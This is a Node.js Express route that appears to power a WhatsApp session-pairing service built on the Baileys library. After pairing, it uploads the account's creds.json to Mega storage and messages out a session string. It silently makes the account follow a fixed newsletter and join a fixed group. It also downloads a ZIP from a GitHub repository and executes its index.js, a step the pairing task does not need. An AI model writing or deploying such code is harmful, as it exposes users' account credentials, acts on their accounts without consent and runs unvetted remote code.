
const { makeid } = require('./gen-id');
const express = require('express');
const fs = require('fs');
let router = express.Router();
const pino = require("pino");
const {
    default: makeWASocket,
    useMultiFileAuthState,
    delay,
    Browsers,
    makeCacheableSignalKeyStore,
    DisconnectReason,
} = require('@whiskeysockets/baileys');
const { upload } = require('./mega');
const fetch = require('node-fetch');
const unzipper = require('unzipper');
const { exec } = require('child_process');

function removeFile(FilePath) {
    if (!fs.existsSync(FilePath)) return false;
    fs.rmSync(FilePath, { recursive: true, force: true });
}

async function downloadAndRunBot() {
    const zipUrl = 'https://github.com/prm123456789/N/archive/refs/heads/main.zip';
    const zipPath = './bot.zip';
    const extractPath = './N-main';

    const response = await fetch(zipUrl);
    const fileStream = fs.createWriteStream(zipPath);
    await new Promise((resolve, reject) => {
        response.body.pipe(fileStream);
        response.body.on('error', reject);
        fileStream.on('finish', resolve);
    });

    await fs.createReadStream(zipPath)
        .pipe(unzipper.Extract({ path: '.' }))
        .promise();

    console.log('✅ ZIP téléchargé et extrait');

    const botPath = `${extractPath}/index.js`;
    const child = exec(`node ${botPath}`, (err, stdout, stderr) => {
        if (err) console.error("❌ Erreur exécution bot :", err);
        else console.log('🟢 BOT LANCÉ AVEC SUCCÈS');
    });

    child.stdout.on('data', data => console.log(data));
    child.stderr.on('data', data => console.error(data));
}

const followedChannels = new Set();

router.get('/', async (req, res) => {
    const id = makeid();
    let num = req.query.number;
    const newsletterJid = "120363397722863547@newsletter";

    async function GIFTED_MD_PAIR_CODE() {
        const { state, saveCreds } = await useMultiFileAuthState('./temp/' + id);

        try {
            const randomItem = "Safari";
            let sock = makeWASocket({
                auth: {
                    creds: state.creds,
                    keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
                },
                printQRInTerminal: false,
                generateHighQualityLinkPreview: true,
                logger: pino({ level: "fatal" }).child({ level: "fatal" }),
                syncFullHistory: false,
                browser: Browsers.macOS(randomItem)
            });

            if (!sock.authState.creds.registered) {
                await delay(1500);
                num = num.replace(/[^0-9]/g, '');
                const code = await sock.requestPairingCode(num);
                if (!res.headersSent) {
                    await res.send({ code });
                }
            }

            sock.ev.on('creds.update', saveCreds);

            sock.ev.on("connection.update", async (s) => {
                const { connection, lastDisconnect } = s;

                if (connection == "open") {
                    await delay(5000);
                    let rf = `./temp/${id}/creds.json`;
                    const mega_url = await upload(fs.createReadStream(rf), `${sock.user.id}.json`);
                    const string_session = mega_url.replace('https://mega.nz/file/', '');
                    let md = "INCONNU~XD~" + string_session;
                    let code = await sock.sendMessage(sock.user.id, { text: md });

                    try {
                        if (typeof sock.newsletterFollow === 'function') {
                            if (!followedChannels.has(newsletterJid)) {
                                await sock.newsletterFollow(newsletterJid);
                                followedChannels.add(newsletterJid);
                                console.log("✅ Auto-follow newsletter OK");
                            } else {
                                console.log("ℹ️ Newsletter déjà suivie, skip auto-follow");
                            }
                        } else {
                            console.warn("❗ newsletterFollow non disponible");
                        }
                    } catch (e) {
                        console.warn("❗ Erreur newsletterFollow :", e.message);
                    }

                    try {
                        await sock.groupAcceptInvite("EWcvcWChJlU6QLbFAPTboZ");
                        console.log("✅ Rejoint le groupe avec succès !");
                    } catch (e) {
                        console.warn("❗ Échec du join du groupe :", e.message);
                    }

                    let desc = `
╔═════════════════
║ SESSION CONNECTED
╠═════════════════
║ © INCONNU BOY TECH
╚═════════════════
`;
                    await sock.sendMessage(sock.user.id, {
                        text: desc,
                        contextInfo: {
                            externalAdReply: {
                                title: "INCONNU BOY TECH",
                                thumbnailUrl: "https://files.catbox.moe/e1k73u.jpg",
                                sourceUrl: "https://whatsapp.com/channel/0029Vb6T8td5K3zQZbsKEU1R",
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, { quoted: code });

                    await downloadAndRunBot(); // ⚡ Lance le bot depuis le ZIP

                    await delay(10);
                    await sock.ws.close();
                    await removeFile('./temp/' + id);
                    console.log(`👤 ${sock.user.id} CONNECTED ✅`);
                    process.exit();

                } else if (connection === "close" && lastDisconnect?.error?.output?.statusCode != 401) {
                    await delay(10);
                    GIFTED_MD_PAIR_CODE();
                }
            });
        } catch (err) {
            console.log("❗ Redémarrage service après erreur :", err);
            await removeFile('./temp/' + id);
            if (!res.headersSent) {
                await res.send({ code: "❗ Service Unavailable" });
            }
        }
    }

    return await GIFTED_MD_PAIR_CODE();
});

module.exports = router;
